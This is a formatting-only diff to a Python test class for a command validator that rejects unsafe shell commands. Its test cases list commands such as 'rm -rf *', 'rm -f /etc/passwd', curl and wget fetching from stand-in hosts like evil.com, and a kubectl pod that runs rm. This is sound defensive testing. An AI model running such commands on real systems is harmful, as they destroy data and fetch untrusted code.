@@ -46,7 +46,11 @@ class TestUnsafeCommands:
             ("rm -rf *", argparse.ArgumentError, None),
             ("rm -f /etc/passwd", argparse.ArgumentError, None),
             ("rmdir /home/user", argparse.ArgumentError, None),
-            ("grep foobar", ValueError, "The command grep can only be used after another command"),
+            (
+                "grep foobar",
+                ValueError,
+                "The command grep can only be used after another command",
+            ),
             # Network operations
             ("curl http://malicious-site.com", argparse.ArgumentError, None),
             ("wget http://evil.com/script.sh", argparse.ArgumentError, None),
@@ -167,7 +171,7 @@ class TestUnsafeCommands:
                 None,
             ),
             (
-                'kubectl run hostpid-pod --image=busybox --command -- rm rf ./',
+                "kubectl run hostpid-pod --image=busybox --command -- rm rf ./",
                 ValueError,
                 "Command 'rm rf ./' not allowed for image 'busybox'",
             ),
